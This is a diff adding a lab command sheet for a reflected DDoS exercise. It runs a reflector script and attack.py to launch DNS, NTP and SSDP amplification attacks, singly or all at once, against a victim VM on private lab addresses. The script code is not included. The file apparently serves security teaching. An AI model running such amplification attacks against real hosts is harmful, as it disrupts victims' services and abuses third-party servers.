@@ -1,0 +1,18 @@
+# Commands for Lab Evaluation 2 - Reflected DDoS
+
+# On the Reflector VM (192.168.56.106) — start the reflector first
+sudo python3 reflector.py
+
+# On the Attacker Machine (192.168.56.1) — run the attacks
+
+# 1. DNS Amplification Attack
+sudo python3 attack.py dns --victim 192.168.56.105 --dns-server 192.168.56.106
+
+# 2. NTP Amplification Attack
+sudo python3 attack.py ntp --victim 192.168.56.105 --ntp-server 192.168.56.106
+
+# 3. SSDP Amplification Attack
+sudo python3 attack.py ssdp --victim 192.168.56.105 --ssdp-server 192.168.56.106
+
+# Run all three attacks sequentially
+sudo python3 attack.py all --victim 192.168.56.105 --dns-server 192.168.56.106 --ntp-server 192.168.56.106 --ssdp-server 192.168.56.106
